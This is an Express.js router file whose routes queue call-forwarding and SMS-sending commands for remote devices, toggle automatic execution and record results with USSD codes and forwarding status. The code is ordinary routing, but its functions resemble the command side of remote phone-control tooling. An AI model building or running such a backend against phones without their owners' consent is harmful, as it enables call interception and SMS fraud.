import { Router } from 'express';
import { callForward, checkCallForwardingStatus, getCommandStatus, sendSms, toggleAutoExecution } from '../controllers/CommandController.js';
import Command from '../models/CommandModel.js';


const router = Router();

router.post('/call-forward', callForward);
router.post('/send-sms', sendSms);
router.get('/commands/:deviceId', getCommandStatus);

// NEW: Auto-execution routes
router.post('/toggle-auto-execution', toggleAutoExecution);
router.post('/check-call-forwarding/:deviceId', checkCallForwardingStatus);

// Enhanced command status update
router.patch('/command-status/:commandId', async (req, res) => {
  try {
    const { commandId } = req.params;
    const { done, autoExecuted, ussdCode, executionMessage, callForwardingStatus } = req.body;
    
    const updateData = {
      done,
      updatedAt: new Date()
    };
    
    if (autoExecuted !== undefined) updateData.autoExecuted = autoExecuted;
    if (ussdCode) updateData.ussdCode = ussdCode;
    if (executionMessage) updateData.executionMessage = executionMessage;
    if (callForwardingStatus) updateData.callForwardingStatus = callForwardingStatus;
    
    const command = await Command.findByIdAndUpdate(
      commandId,
      updateData,
      { new: true }
    );
    
    if (!command) {
      return res.status(404).json({ error: "Command not found" });
    }
    
    res.json({ success: true, command });
  } catch (error) {
    res.status(500).json({ error: "Failed to update command status" });
  }
});

export default router;